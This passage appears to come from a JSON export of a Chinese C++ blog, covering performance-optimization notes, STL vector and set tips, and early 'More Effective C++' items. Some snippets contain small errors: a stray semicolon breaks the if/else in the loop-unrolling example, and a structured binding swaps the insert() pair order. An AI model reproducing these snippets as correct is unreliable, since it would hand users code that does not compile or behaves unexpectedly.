一个较小并且有固定的重复计数，且没有分支的循环，可以完美地被预测。 循环展开 展开前 123456789int i;for (i &#x3D; 0; i &lt; 20; i++)&#123; if (i % 2 &#x3D;&#x3D; 0); FuncA(i); else FuncB(i); FuncC(i);&#125; 展开后 12345678int i;for (i &#x3D; 0; i &lt; 20; i+&#x3D;2)&#123; FuncA(i); FuncC(i); FuncB(i+1); FuncC(i+1);&#125; 这样做的好处： 循环次数变成了10次而不是20次，CPU可以更完美的进行预测 if分支被消除，有利于编译器自动进行向量化等优化 循环展开的坏处： 展开循环后在代码缓存中占用更多空间 非常小的循环展开不如不展开 如果重复计数为奇数，并将其展开为2， 则必须在循环之外执行额外的迭代。 只有在能够取得特定好处的情况下，才应该使用循环展开。 比如，如果一个循环包含浮点运算，且循环计数器是整数，那么通常可以假设整个计算时间是由浮点代码决定的，而不是由循环控制分支决定的。在这种情况下，展开循环是没有任何好处的 。 循环控制条件 如果循环控制分支依赖于循环内部的计算，则效率较低。 确定最坏情况下的最大重复计数并始终使用此迭代次数的效率会更高。 循环计数器最好是整数。 复制或清除数组 对于诸如复制数组或将数组中的元素全部设置为零这样的琐碎任务，使用循环可能不是最佳选择。 使用 memset 和 memcpy 函数通常会更快。 11 函数 函数调用会让程序慢下来，因为 代码地址跳转，可能需要4个时钟周期 如果代码分散在内存中会降低代码缓存效率 如果函数参数不够放在寄存器中，需要入到栈中，效率不高 需要额外时间设置stack frame, 保存和恢复寄存器 每个函数调用语句需要在分支目标缓冲区（BTB）中占用空间，BTB中发生资源竞争可能会导致分支预测失败。 如何避免函数调用降低效率呢？ 避免不必要函数 不要过度封装。 使用内联函数 如果函数很小，或者只在程序中的一个位置调用它，那么内联函数是有好处的。小函数通常由编译器自动内联。 避免在最内层循环嵌套函数调用 如果在程序关键的最内层循环包含对帧函数的调用，那么代码有可能通过内联帧函数或使帧函数调用的所有函数内联（把帧函数变为叶函数）来提升效率。 帧函数（Frame Function）： 帧函数是指在程序执行期间创建的函数调用帧（Function Frame）或栈帧（Stack Frame）。每当函数被调用时，会在内存中分配一个帧来存储函数的局部变量、参数和其他相关信息。 帧函数用于描述函数调用期间的堆栈结构，包含了函数的执行上下文、局部变量和临时数据等。它提供了函数执行的环境和上下文切换所需的信息。 帧函数还包括函数调用返回时所需的清理操作，如恢复调用者的上下文和处理返回值等。 叶函数（Leaf Function）： 叶函数是指在函数调用期间不会调用其他函数的函数，即它没有其他的子函数调用。叶函数执行完毕后直接返回，而不会进一步调用其他函数。 叶函数通常比较简单，不涉及复杂的递归或函数调用链，并且在性能优化方面具有一定的优势。 使用宏代替函数 不要滥用宏，宏的问题是：名称不能重载或限制作用区域。宏将干扰具有相同名称的任何函数或变量，而与作用域或命名空间无关。 使函数局部化 应该使同一个模块中使用的函数（即当前 .cpp 文件）是局部的。 这使得编译器更容易将函数内联，并对函数调用进行优化。 如何使函数局部化呢？ 对于非类成员函数，直接使用static 对于类成员函数，将函数或类放置于匿名命名空间中 使用全程序优化 一些编译器具有对整个程序进行优化的选项，也可以选择将多个 .cpp 文件组合成一个对象文件。这使得编译器能够在组成程序的所有 .cpp 模块之间优化寄存器分配和参数传递。 使用64位模式 现在服务器端开发都是64位模式了吧？ 函数参数 在大多数情况下，函数参数是按值传递的。这意味着参数的值被复制到一个局部变量中。对于int、float、double、bool、enum 以及指针和引用等简单类型，这非常快。 数组总是使用指针传递，除非它们被打包在类或者结构体中。 如果参数是复合类型，在以下情况下传值更高效，否则使用指针和引用更高效： 对象很小，可以装入一个寄存器 对象没有拷贝构造函数和析构函数 对象没有虚成员 对象没有使用RTTI 将复合对象传递给函数的首选方法是使用 const 引用。其次是使函数成为对象的类成员。 64位 unix 系统允许寄存器中传输最多14个参数 (8个float或double，加上6个整数、指针或引用参数) 函数返回类型 函数的返回类型最好是简单类型、指针、引用或 void。返回复合类型的对象更为复杂，而且常常效率低下。 简单情况下，复合类型对象直接从寄存器返回。否则通过一个隐藏指针将它们复制到调用方指定的位置。 当直接返回复杂类型对象的值时，编译器可能会进行RVO(return value optimization)优化，从而避免复制构造和析构成本，但开发者不应依赖这一点。 函数尾调用 尾调用是优化函数调用的一种方法。如果函数的最后一条语句是对另一个函数的调用，那么编译器可以用跳转到第二个函数来替换该调用。 编译器优化将自动完成此任务。第二个函数不会返回到第一个函数，而是直接返回第一个函数被调用的位 置。这样效率更高，因为它消除了返回操作。 递归函数 函数递归调用对于处理递归数据结构非常有用。递归函数的代价是所有参数和局部变量在每次递归时都会有一个新实例，这会占用栈空间。 较宽的树形结构比较深的树形结构，有更高的递归效率。 无分支递归总是可以用循环代替，这样的效率更高 12 结构体和类 面向对象的好处： 变量存储在一起，数据缓存更有效率 无需将类成员变量作为参数传递给类成员函数，避免参数传递的开销 面向对象的坏处： 非静态成员函数有this指针，有额外开销 虚成员函数的效率较低 如果面向对象的编程风格有利于程序的逻辑结构和清晰性，那么你可以使用这种风格 类的数据成员 类或结构体的数据成员是按创建类或结构实例时声明它们的顺序连续存储。将数据组织到类或结构体中不存在性能损失。 大多数编译器将数据成员对齐到可以被特定数整除的地址以优化访问，副作用是产生字节空洞。 类的成员函数 每次声明或创建类的新对象时，它都会生成数据成员的新实例。但是每个成员函数只有一个实例。函数代码不会被复制。 静态成员函数不能访问任何非静态数据成员或非静态成员函数。静态成员函数比非静态成员函数快。 虚成员函数 多态性是面向对象程序比非面向对象程序效率低的主要原因之一。 如果可以避免使用虚函数，那么你就可以获得面向对象编程的大多数优势，而无需付出性能成本 。 如果函数调用语句总是调用虚函数的相同版本，那么调用虚成员函数所花费的时间要比调用非虚成员函数多几个时钟周期。如果版本发生了变化，你可能会得到10‐20个时钟周期的错误预测惩罚。 有时可以使用模板（编译时多态）而不是虚函数来获得所需的多态性效果。 运行时类型识别（RTTI） 效率不高。如果编译器有RTTI 选项，那么关闭它并使用其他实现。 继承 派生类的对象与包含父类和子类成员的简单类的对象的实现方法相同。父类和子类的成员访问速度相同。 一般来说，你可以假设使用继承几乎没有任何性能损失。 除了： 父类数据成员大小会添加到子类成员的偏移量中。偏移量太大时，会造成数据缓存效率降低。 父类和子类代码可能在不同模块。造成代码缓存效率降低。 另外，尽量不使用多重继承，代之以组合。 联合体 union 是数据成员共享相同内存空间的结构。union 可以通过允许不同时使用的两个数据成员共享同一块内存来节省内存空间。 位域 位域虽然有助于使数据更加紧凑，但是访问位域成员不如访问结构的成员效率高。如果在大数组可以节省缓存空间或使文件更小，那么额外的时间是合理的 重载函数 重载函数的不同版本被简单地视为不同的函数。使用重载函数没有性能损失。 重载运算符 重载的运算符相当于一个函数。使用重载运算符与使用具有相同功能的函数效率一样。 13 模板 模板与宏的相似之处在于，模板参数在编译之前被替换。 模板是高效的，因为模板参数总是在编译时被解析。模板使源代码更加复杂，而不是编译后的代码。一般来说，使用模板在执行速度方面没有任何成本。 使用模板实现编译时多态 模板类可用于实现编译时多态性，这比使用虚拟成员函数获得的运行时多态性更加高效。 模板代码可读性不佳。 14 线程 线程上下文切换非常耗时，可通过设置更长的时间片来减少上下文切换的次数。另外，为不同任务的不同线程分配不同的优先级是非常有用的。 为了充分利用多核，可以将工作划分成多个线程，每个线程在单独的CPU core上执行。但是多线程有四个成本： 启动和停止线程的成本。如果任务执行时间很短，不要为其单独分配线程。 线程切换成本。 线程间同步和通信成本。 不同线程需要单独的存储空间，线程有各自的堆栈，如果线程共享相同的缓存，可能会导致缓存竞争。 多线程程序必须使用线程安全函数，线程安全函数永远不应该使用静态变量 (除非是只读的静态变量) 。 15 异常和错误处理 C++中通过try catch捕获异常。异常处理旨在检测很少发生的错误，并以一种优雅的方式从错误条件中恢复。 但是，即使程序运行时没有错误，异常处理仍需要额外的时间，花销多少取决于编译器实现。 如果你的应用程序不需要异常处理，那么应该禁用它，以便使代码更小、更高效。 可以通过关闭编译器中的异常处理选项来禁用整个程序的异常处理。或者，也可以通过向函数原型中添加 throw() 声明来禁用单个函数的异常处理。 异常和向量代码 向量指令对于并行执行多个计算是有用的。如果代码可以从向量指令中获益，那么最好禁用异常捕获，转而依赖 NAN 和 INF 的传递。 避免异常处理的成本 当不需要尝试从错误中恢复时，不需要异常处理。 建议使用系统的、经过深思熟虑的方法来处理错误。 区分可恢复错误和不可恢复错误。 确保分配的资源在发生错误时得到清理，向用户发送适当的错误消息。 编写异常安全代码 为了保证异常安全，需要在发生异常时清理下列资源： 使用new和malloc分配的内存 句柄 互斥量 数据库连接 网络连接 待删除临时文件 待保护的用户工作 其他已分配的资源 C++ 处理清理工作的方法是创建一个析构函数。C++ 异常处理系统确保调用本地对象的所有析构函数。 如果类有析构函数来处理分配资源的所有清理工作，则程序是异常安全的。如果析构函数引发另一个异常，则系统可能会出现问题。 如果你使用自己的错误处理系统而不是使用异常处理，那么你无法确保是否调用了所有析构函数并清理了资源。 如果错误处理程序调用 exit()、abort()、_endthread() 等，则不能保证所有析构函数被调用。 NAN和INF的传递 浮点溢出和除以 0 得到无穷大 INF。 如果你把无穷大和某数相加或相乘，结果就是无穷大 INF。 如果用一个正常的数字除以 INF，会得到 0。 INF ‐ INF 和 INF / INF 得到 NAN （not‐a‐number）。 当你用 0 除以 0 以及函数的输入超出范围时，比如 sqrt(‐1) 和 log(‐1)，也会出现特殊的代码NAN。 INF 和 NAN 的传播也不需要额外的成本。 当参数为 INF 或 NAN 时，函数 finite() 将返回 false，如果它是一个普通的浮点数，则返回 true。 16 预处理命令 就程序性能而言，预处理指令（以#开头的所有指令）的性能成本很少，因为它们在程序编译之前就已经解析了。 17 命名空间 使用名称空间，对执行速度没有影响。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Book","slug":"Book","permalink":"https://racleray.github.io/tags/Book/"}],"author":"HeRui"},{"title":"STL Tips","slug":"STL-Tips","date":"2022-06-13T14:23:13.000Z","updated":"2024-01-09T10:19:57.349Z","comments":true,"path":"posts/351032d1.html","link":"","permalink":"https://racleray.github.io/posts/351032d1.html","excerpt":"C++ STL 笔记","text":"vector vector 的功能是长度可变的数组，他里面的数据存储在堆上。vector 是一个模板类，第一个模板参数是数组里元素的类型。 Functions 构造函数和 size 1234567891011121314151617181920212223242526272829303132// ...// vector 可以在构造时指定初始长度// vector&lt;int&gt; a(4);explicit vector(size_t n);// 要创建 4 个 233 组成的数组就可以写：// vector&lt;int&gt; a(4, 233);// 等价于// vector&lt;int&gt; a = &#123;233, 233, 233, 233&#125;;explicit vector(size_t n, int const &amp;val);// 通过 a.size() 获得数组的长度size_t size() const noexcept;// 利用初始化列表（C++11 新特性）在构造时就初始化其中元素的值// vector&lt;int&gt; a = &#123;6, 1, 7, 4&#125;; // or// vector&lt;int&gt; a&#123;6, 1, 7, 4&#125;;vector(initializer_list&lt;int&gt; list);// 访问 vector 里的元素 还可以写入int &amp;operator[](size_t i) noexcept;int const &amp;operator[](size_t i) const noexcept;// 为了防止不小心越界，可以用 a.at(i) 替代 a[i]// at 函数会检测索引 i 是否越界int &amp;at(size_t i);int const &amp;at(size_t i) const;// ... explicit vector(size_t n); 显式构造函数会调用元素的默认构造函数，数字类型会初始化为 0，string 会初始化为空字符串，指针类型会初始化为 nullptr。 std::execution::par capacity() 函数查询已经分配内存的大小，即最大容量； 1size_t capacity() const noexcept; size() 返回的其实是已经存储了数据的数组长度。size 范围内的数据都是初始化的。 size 到 capacity 之间的内存是没有初始化的。 另外，使用 reserve() 函数预留一定的容量，这样之后就不会出现容量不足而需要动态扩容影响性能了（前提是保证容量一定足够）。此外，还要注意 reserve 时也会移动元素。 1size_t reserve(size_t n); reserve() 只是申请内存，不做初始化。 resize 除了可以在构造函数中指定数组的大小，还可以之后再通过 resize 函数设置大小。 123456// vector&lt;int&gt; a(4);// 等价于：// vector&lt;int&gt; a;// a.resize(4);void resize(size_t n);void resize(size_t n, int const &amp;val); 调用 resize(n) 的时候，不足部分，会用 0 填充元素，原有元素会保持不变。 123456789// vector&lt;int&gt; a = &#123;1, 2&#125;;// a.resize(4);// 等价于：// vector&lt;int&gt; a = &#123;1, 2, 0, 0&#125;;// vector&lt;int&gt; a = &#123;1, 2, 3, 4, 5, 6&#125;;// a.resize(4);// 等价于：// vector&lt;int&gt; a = &#123;1, 2, 3, 4&#125;; 当 resize 的目标长度大于原有的容量（capacity）时，就需要重新分配一段更大的连续内存，并把原数组长度的部分移动过去，多出来的部分则用 0 来填充。导致元素的地址会有所改。 shrink_to_fit 当 resize 到一个更小的大小上时，多余的容量不会释放，而是继续保留。 shrink_to_fit 释放掉多余的容量，只保留刚好为 size() 大小的容量。 shrink_to_fit 会重新分配一段更小内存，他同样是会把元素移动到新内存中的，因此迭代器和指针也会失效。 1size_t shrink_to_fit(); clear clear 函数可以清空该数组，也就相当于把长度设为零，变成空数组。 容量(capacity)还是摆在那里，clear 仅仅只是把数组大小(size)标记为 0 而已。 要真正释放掉内存，可以在 clear 之后再调用 shrink_to_fit，这样才会让容量也变成 0（这时 vector 的 data 会返回 nullptr）。 1234// a.clear();// 等价于：// a.resize(0); 或 a = &#123;&#125;;void clear() noexcept; push_back 123456// vector&lt;int&gt; a = &#123;1, 2&#125;;// a.push_back(3);// 等价于：// vector&lt;int&gt; a = &#123;1, 2, 3&#125;;void push_back(int const &amp;val);void push_back(int &amp;&amp;val); // C++11 新增 pop_back 函数则是和 push_back 相反。 要注意的是 pop_back 函数的返回类型是 void，也就是没有返回值，如果需要获取删除的值，可以在 pop_back() 之前先通过 back() 获取末尾元素的值，实现 pop 效果。 data data() 会返回指向数组中首个元素的指针，也就是等价于 &amp;a[0]。由于 vector 是连续存储的数组，因此只要得到了首地址，下一个元素的地址只需指针 +1 即可。 12int *data() noexcept;int const *data() const noexcept; data() 指针是对 vector 的一种引用，实际对象生命周期仍由 vector 类本身管理。 用他来获取一个 C 语言原始指针 int *，很方便用于调用 C 语言的函数和 API 等，同时还能享受到 vector 容器 RAII 的安全性。 如果用 new/delete 或者 malloc/free 就很容易出现忘记释放内存的情况，造成内存泄露。 而 vector 会在离开作用域时，自动调用解构函数，释放内存，就不必手动释放了，更安全。 如果需要在一个语句块外仍然保持 data() 对数组的弱引用有效，可以把语句块内的 vector 对象移动到外面的一个 vector 对象上。vector 在移动时指针不会失效： 12345678910111213141516171819#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;vector&lt;int&gt; holder;int main() &#123; int *p; &#123; vector&lt;int&gt; a = &#123;1, 2, 3&#125;; p = a.data(); cout &lt;&lt; p[0] &lt;&lt; endl; cout &lt;&lt; p[0] &lt;&lt; endl; holder = std::move(a); // 延续生命周期 &#125; cout &lt;&lt; p[0] &lt;&lt; endl; return 0;&#125; insert insert 函数，他的第一个参数是要插入的位置（用迭代器表示），第二个参数则是要插入的值。 insert 在容量不足时，同样会造成重新分配以求扩容，会移动其中所有元素，这时所有之前保存的迭代器都会失效。 insert 函数，重复插入多个相同的值。或者直接插入一个初始化列表。或者另一个容器的起止迭代器。 12345a.insert(插入位置, 重复多少次, 插入的值);a.insert(插入位置, &#123;插入值1, 插入值2, ...&#125;);a.insert(插入位置, b.begin(), b.end());// 对于 C 语言的数据结构使用全局的 std::begin(), std::end() 函数a.insert(插入位置, std::begin(c), std::end(c)); emplace 1iterator emplace (const_iterator pos, args...); args... 表示与新插入元素的构造函数相对应的多个参数。 emplace() 每次只能插入一个元素，而不是多个。 emplace() 高效之处在于，直接在容器申请内存之上进行构造。而 insert() 是先构造好对象，在拷贝或者移动到容器的内存中。 assign 和 insert 不同的是，他会把旧有的数组完全覆盖掉，变成一个新的数组。 a.assign(beg, end) 基本和 a = vector&lt;int&gt;(beg, end) 等价，唯一的区别是后者会重新分配内存，而前者会保留原来的容量不会释放掉。 123456template &lt;class It&gt; // 这里 It 可以是其他容器的迭代器类型void assign(It beg, It end);// 把 vector 批量填满一个特定的值void assign(size_t n, int const &amp;val);// 接受一个初始化列表作为参数void assign(initializer_list&lt;int&gt; val); a.assign({x, y, ...}) 和 a = {x, y, ...} 完全等价，都会保留原来的容量。而和 a = vector&lt;int&gt;{x, y, ...} 就不等价，这个会重新分配内存。 erase erase 的复杂度最坏情况是删除第一个元素 O(n)。如果删的是最后一个元素则复杂度为 O(1)。因为 erase 会移动 pos 之后的那些元素，保持连续数据分配。 123iterator erase(const_iterator pos);// 批量删除一个区间iterator erase(const_iterator beg, const_iterator end); Iterator 为什么会有iterator设计的需要？ 为不同容器提供一个更一般化的操作接口 假设需要一个print函数，要打印容器中字符元素。简单实现是： 12345678910111213void print(vector&lt;char&gt; const &amp;a) &#123; for (int i = 0; i &lt; a.size(); i++) &#123; cout &lt;&lt; a[i] &lt;&lt; endl; &#125;&#125;void print(string const &amp;a) &#123; for (int i = 0; i &lt; a.size(); i++) &#123; cout &lt;&lt; a[i] &lt;&lt; endl; &#125;&#125;... vector 和 string 的底层都是连续的稠密数组，改用首地址指针和数组长度做参数。 这样 print 在无需知道容器具体类型的情况下，只用最简单的接口（首地址指针）就完成了遍历和打印的操作。 12345678910111213void print(char const *a, size_t n) &#123; for (int i = 0; i &lt; n; i++) &#123; cout &lt;&lt; a[i] &lt;&lt; endl; &#125;&#125;int main() &#123; vector&lt;char&gt; a = &#123;'h', 'j', 'k', 'l'&#125;; print(a.data(), a.size()); string b = &#123;'h', 'j', 'k', 'l'&#125;; print(b.data(), b.size()); return 0;&#125; 通过给指针加减运算，选择其中一部分连续的元素来打印。 再改变一些，改用首地址指针和尾地址指针。用指针作为迭代变量。 尾地址指针实际上是指向末尾元素再往后后一个元素的指针。 数组长度为 0 就是 begptr == endptr 的情况；endptr - begptr 来算出数组的长度；判断是否继续循环的条件为 ptr != endptr 。 1234567891011121314151617181920template &lt;class Ptr&gt;void print(Ptr begptr, Ptr endptr) &#123; for (Ptr ptr = begptr; ptr != endptr; ++ptr) &#123; auto value = *ptr; cout &lt;&lt; value &lt;&lt; endl; &#125;&#125;int main() &#123; vector&lt;char&gt; a = &#123;'h', 'j', 'k', 'l'&#125;; char const *abegptr = a.data(); char const *aendptr = a.data() + a.size(); print(abegptr, aendptr); vector&lt;int&gt; b = &#123;1, 2, 3, 4&#125;; int const *bbegptr = b.data(); int const *bendptr = b.data() + b.size(); print(bbegptr, bendptr); return 0;&#125; 通过操作符重载，适配不同内存布局的容器类型 上述首指针和尾指针的组合方法，的确能胜任 vector 这种连续数组，但是对于 list 这种不连续的内存的容器就没辙了。 list&lt;char&gt;::iterator 是一个特殊定义过的类型，其具有 != 和 ++ 以及 * 这些运算符的重载。把 ++ 对应到 链表的 curr = curr-&gt;next 上。 用起来就像普通的指针，但内部却通过运算符重载适配不同容器的特殊类，就是迭代器(iterator)，迭代器是 STL 中容器和算法之间的桥梁。 123456789101112131415template &lt;class Ptr&gt;void print(Ptr begptr, Ptr endptr) &#123; for (Ptr ptr = begptr; ptr != endptr; ptr++) &#123; auto value = *ptr; cout &lt;&lt; value &lt;&lt; endl; &#125;&#125;int main() &#123; list&lt;char&gt; a = &#123;'h', 'j', 'k', 'l'&#125;; list&lt;char&gt;::iterator begptr = a.begin(); list&lt;char&gt;::iterator endptr = a.end(); print(begptr, endptr); return 0;&#125; ++ ++p 会返回自增后的值 p + 1，这和 p += 1 完全一样，同样因为返回的是一个左值引用。 p++ 会返回自增前的值 p，返回的是一个右值。后置自增需要先保存旧的迭代器，然后自增自己，再返回旧迭代器，可能会比较低效。 123456789101112131415161718192021struct Iterator &#123; Node* curr; // 无参++ 前置++ Iterator&amp; operator++() &#123; curr = curr-&gt;next; return *this; &#125; // 带参++ 后置++ Iterator operator++(int) &#123; Iterator tmp = *this; this-&gt;operator++(); return tmp; &#125; T&amp; operator*() const &#123; return curr-&gt;value; &#125; bool operator!=(Iterator const&amp; that) const &#123; return curr != that.curr; &#125;&#125;; 同名函数只能通过参数列表类型来区分，这个 int 类型参数没有任何实际意义，只是为了区分不同的重载。 编译器会在 p++ 的时候自动改成调用 p.operator++(0)。 set set会自动给其中的元素从小到大排序，set&lt;T, CompT&gt; CompT定义排序函数 set会去重 红黑树储存，不支持随机访问 高效的按值查找 Iterator 提供的运算符重载 具有此迭代器的容器 对应的 C++20 concept 输入迭代器 *（可读取），!=，==，++（一次性） istream_iterator input_iterator 输出迭代器 *（可写入），!=，==，++（一次性） back_insert_iterator output_iterator 前向迭代器 *，!=，==，++ forward_list forward_iterator 双向迭代器 *，!=，==，++，-- set，map，list bidirectional_iterator 随机访问迭代器 *，!=，==，++，--，+，-，+=，-=，[] vector，array，deque random_access_iterator 迭代器外包装 和他所包装的迭代器保持一致 reverse_iterator 和所包装的迭代器一致 前向迭代器＞双向迭代器＞随机访问迭代器。 这意味着如果一个STL模板函数（比如std::find）要求迭代器是前向迭代器即可，那么也可以给他随机访问迭代器，因为前向迭代器是随机访问迭代器的子集。 set 不支持随机访问，没有提供 + 和 += 的重载。 std::next set 的 + 3 访问，通过std::next实现： 123set&lt;int&gt; a = &#123;1, 2, 3&#125;;set&lt;int&gt;::iterator a_it = a.begin();a_it = std::next(a_it, 3); // set[3] std::advance 会就地自增： 1std::advance(a_it, 3); // 相当于+= next 和 advance 同样支持负数。 与 next 对应的有 std::prev ，向前访问。 此外 std::distance 可求出两个迭代器之间的距离。 Funtions insert 1pair&lt;iterator, bool&gt; insert(int val); insert 函数的返回值是一个 pair 类型，也就是说他同时返回了两个值。其中第一个返回值指向插入/现有元素的迭代器；第二个返回值是 bool 类型，指示了插入是否成功。 pair 作为返回值，可以直接： 12...return &#123;first, second&#125;; C++ 17 可以使用结构化绑定拆解 pair 12345auto [ok, it] = b_set.insert(3);// 等价于auto tmp = b_set.insert(3);auto ok = tmp.first;auto it = tmp.second; find 12iterator find(int const &amp;val) const;size_t count(int const &amp;val) const; set.find(x) != set.end() 判断集合 set 中是否存在元素 x。相比 set.count(x) != 0 会高效一些。 erase 12size_t erase(int const &amp;val);iterator erase(iterator first, iterator last); erase 返回一个整数，表示被他删除元素的个数。使用上比如：set.erase(std::prev(set.end())) 会删除集合中最大的元素。 erase 还支持输入两个迭代器作为参数。删除前开后闭区间 [beg, end) 内的元素。 关于区间，set.lower_bound(x) 找第一个大于等于 x 的元素。set.upper_bound(x) 找第一个大于 x 的元素。 12// 删除 [3, 6] 区间内的元素a_set.erase(a_set.lower_bound(3), a_set.upper_bound(6)); 操作 实现方法 增 a.insert(x) 删 a.erase(x) 或者 a.erase(a.find(x)) 改 一旦插入就无法修改，只能先删再增 查 a.find(x) != a.end() 或者 a.count(x) 容器转换 12345template &lt;class ForwardIt&gt;explicit vector(ForwardIt beg, ForwardIt end);template &lt;class ForwardIt&gt;explicit set(ForwardIt beg, ForwardIt end); vector 的构造函数可以接受任何前向迭代器。不一定是 vector 自己的迭代器哦，任何前向迭代器！而 set 是双向迭代器，覆盖了前向迭代器，满足要求。 反过来，可以把 vector 转成 set。set(b.begin(), b.end()) 。 所以可以实现简单的vector排序功能： 123vector&lt;int&gt; arr = &#123;4,3,1,5&#125;;set&lt;int&gt; tmp(arr.begin(), arr.end());arr.assign(tmp.begin(), tmp.end()); // assign 利用现有分配内存 clear 123a_set.clear();a_set = &#123;&#125;;a_set.erase(a_set.begin(), a_set.end()); emplace 123pair&lt;iterator,bool&gt; emplace (Args&amp;&amp;... args);iterator emplace_hint (const_iterator position, Args&amp;&amp;... args); 只需要传入构建新元素所需的数据即可，该方法可以自行利用这些数据构建出要添加的元素。 emplace_hint 方法需要额外传入一个迭代器，用来指明新元素添加到 set 容器的具体位置（新元素会添加到该迭代器指向元素的前面）。 相比具有同样功能的 insert() 方法，完成同样的任务，emplace() 和 emplace_hint() 的效率会更高。 multiset multiset 是 set 不去重版本。使用类似。 支持等值区间查询。equal_range 返回的等值区间。 1pair&lt;iterator, iterator&gt; equal_range(int const &amp;val) const; 不同 set 成员函数 函数 含义 set multiset unordered_set insert(x) 插入一个元素 x √ √ √ erase(x) 删除所有等于 x 的元素 √ √ √ count(x) 有多少个等于 x 的元素 √，0或1 √ √，0或1 find(x) 指向第一个等于 x 的元素 √ √ √ lower_bound(x) 指向第一个大于等于 x 的元素 √ √ × upper_bound(x) 指向第一个大于 x 的元素 √ √ × equal_range(x) 所有等于 x 的元素所组成的区间 √ √ √ 和 vector 的横向比较： 类型 去重 有序 查找 插入 vector × × O(n) O(1) ~ O(n) set √ √ O(logn) O(logn) multiset × √ O(logn) O(logn) unordered_set √ × O(1) O(1) unordered_multiset × × O(1) O(1) 类型 头文件 lower/upper_bound equal_range find vector √，O(logn) √，O(logn) √，O(n) set √，O(logn) √，O(logn) √，O(logn) multiset √，O(logn) √，O(logn) √，O(logn) unordered_set × √，O(1) √，O(1) unordered_multiset × √，O(1) √，O(1) unordered_set 的性能在数据量足够大（＞1000）时，平均查找时间比 set 短，但不保证稳定。set在数据量小时更高效。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"STL","slug":"STL","permalink":"https://racleray.github.io/tags/STL/"}],"author":"HeRui"},{"title":"More Effective Cpp","slug":"More-Effective-Cpp","date":"2022-05-09T04:01:49.000Z","updated":"2024-01-09T10:23:18.155Z","comments":true,"path":"posts/e584d079.html","link":"","permalink":"https://racleray.github.io/posts/e584d079.html","excerpt":"More Effective Cpp 读书笔记","text":"一、基础 条款 1：仔细区别 pointers和references 没有 null reference。一个 reference 必须总代表某个对象。 所以如果你有一个变量，其目的是用来指向（代表）另一个对象，但是也有可能它不指向（代表）任何对象，那么你应该使用 pointer，才可以将 pointer 设为 null。 Pointers 和 references 之间的另一个重要差异就是，pointers 可以被重新赋值，指向另一个对象，reference 却总是指向（代表）它最初获得的那个对象。 当你需要考虑“不指向任何对象”的可能性时，或是考虑“在不同时间指向不同对象”的能力时，你就应该采用 pointer。 当你确定“总是会代表某个对象”，而且“一旦代表了该对象就不能够再改变”，那么你应该选用 reference。 条款 2：最好使用 C++转型操作符 C++有 4个新的转型操作符（cast operators）：static_cast，const_cast，dynamic_cast 和 reinterpret_cast。 static_cast 基本上拥有与 C 旧式转型相同的威力与意义，以及相同的限制。 const_cast 用来改变表达式中的常量性（constness）或变易性（volatileness）。 dynamic_cast 用来执行继承体系中“安全的向下转型或跨系转型动作”。也就是说你可以利用 dynamic_cast，将“指向 base class objects的 pointers或references” 转型为“指向 derived class objects 的 pointers 或references”。如果转型失败，会以一个 null指针（当转型对象是指针）或一个 exception（当转型对象是 reference）表现出来。 reinterpret_cast 转换结果几乎总是与编译平台息息相关。所以 reinterpret_casts 不具移植性。reinterpret_cast 的最常用用途是转换“函数指针”类型。 1234567typedef void (*FuncPtr)();FuncPtr funcPtrArray[10];int doSomething();// funcPtrArray[0] = &amp;doSomething; // 错误！类型不匹配funcPtrArray[0] = reinterpret_cast&lt;FuncPtr&gt;(&amp;doSomething); 条款 3：绝对不要以多态（polymorphically）方式处理数组 多态（polymorphism）和指针运算不能混用。数组对象几乎总是会涉及指针的算术运算，所以数组和多态不要混用。原因之一，若发生通过父类指针删除一个子类对象，其结果未定义。 条款 4：非必要不提供 default constructor 添加无意义的 default constructors，也会影响 class 的效率。 如果使用 member functions 测试字段是否真被初始化了，其调用者便必须为测试行为付出时间代价，并为测试代码付出空间代价。万一测试结果为否定，对应的处理程序又需要一些空间代价。 如果可以自定义 class constructors 确保对象的所有字段都会被正确地初始化，上述所有成本便都可以免除。default constructors 无法提供这种保证，那么最好避免让 default constructors 出现。 二、操作符 条款 5：对定制的“类型转换函数”保持警觉 两种函数允许编译器执行类型隐式转换：单自变量 constructors 和 隐式类型转换操作符。 所谓单自变量 constructors 是指能够以单一自变量成功调用的 constructors。如此的 constructor 可能声明拥有单一参数，也可能声明拥有多个参数，并且除了第一参数之外都有默认值。 所谓隐式类型转换操作符，是一个拥有奇怪名称的member function：关键词operator 之后加上一个类型名称。 12345678910class Rational &#123;public: Rational(int numerator, int denominator = 1); operator double() const; ...&#125;;Rational r(1,2);Rational a = 1 * r; // constructors转换1为Rational r(1,1)double d = 0.5 * r; // double()转换r为0.5 隐式转换可能带来不易察觉的问题或者错误。 C++引入关键词 explicit，就是为了解决隐式类型转换带来的问题。其用法十分直接易懂，只要将constructors声明为 explicit，编译器便不能因隐式类型转换的需要而调用它们。不过显式类型转换仍是允许的。 对于隐式类型转换操作符，如非必要，最好不要设计，而是设计一个功能对等的成员函数，以供显示调用。 123456class Rational &#123;public: explicit Rational(int numerator, int denominator = 1); double asDouble() const; ...&#125;; 条款 6：自增(increment)、自减(decrement)操作符前缀形式与后缀形式的区别 重载函数是以其参数类型来区分彼此的，然而不论 increment 或 decrement 操作符的前置式或后置式，逻辑上都没有参数。为了做出区分，只好让后置式有一个 int 自变量，并且在它被调用时，编译器默默地为该 int 指定一个 0 值。 处理用户定制类型时，应该尽可能使用前置式 increment。 后置式 increment 和 decrement 操作符的实现应以其前置式兄弟为基础。方便维护，减少代码重复。 123456789101112131415161718192021class UPInt &#123;public: UPInt&amp; operator++(); // 前++ const UPInt operator++(int); // 后++ UPInt&amp; operator--(); const UPInt operator--(int); UPInt&amp; operator+=(int); ...&#125;;// prefix：increment and fetchUPInt&amp; UPInt::operator++() &#123; *this += 1; return *this;&#125; // postfix form: fetch and increment const UPInt UPInt::operator++(int) &#123; UPInt oldValue = *this; ++(*this); return oldValue; &#125; 条款 7：千万不要重载&amp;&amp;，||和，操作符 